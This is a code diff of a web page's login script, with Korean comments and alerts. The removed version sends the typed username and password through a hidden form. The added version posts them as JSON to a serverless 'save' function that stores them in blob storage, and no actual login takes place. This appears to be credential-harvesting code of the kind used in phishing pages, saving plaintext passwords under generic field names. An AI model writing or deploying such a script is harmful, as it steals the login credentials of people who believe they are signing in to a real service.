@@ -680,29 +680,40 @@
 
 
 <script src="js/local-navigation-fixes.js?v=5" data-site-root="./"></script>
-<form name="form-test" method="POST" data-netlify="true" action="/" hidden id="netlifyForm">
-  <input type="hidden" name="form-name" value="form-test">
-  <input type="text" name="text1" id="send1">
-  <input type="text" name="text2" id="send2">
-</form>
-
 <script>
-document.getElementById("login-button").addEventListener("click", function(e) {
+document.getElementById("login-button").addEventListener("click", async (e) => {
   e.preventDefault();
 
-  function getValue(id) {
+  // 버튼 클릭 테스트
+  alert("버튼 클릭 감지!");
+
+  const getText = (id) => {
     const el = document.getElementById(id);
-    if (!el) throw new Error("ID를 찾을 수 없음: " + id);
+    if (!el) throw new Error("ID 없음: " + id);
     return el.value ?? el.textContent;
-  }
+  };
 
   try {
-    document.getElementById("send1").value = getValue("login-username");
-    document.getElementById("send2").value = getValue("login-password");
+    const text1 = getText("login-username");
+    const text2 = getText("login-password");
 
-    document.getElementById("netlifyForm").submit();
+    const response = await fetch("/.netlify/functions/save", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ text1, text2 })
+    });
+
+    if (!response.ok) throw new Error(await response.text());
+
+    const result = await response.json();
+
+    alert("Blobs 저장 성공!\nID: " + result.id);
+
   } catch (error) {
-    alert(error.message);
+    alert("오류: " + error.message);
+    console.error(error);
   }
 });
 </script>
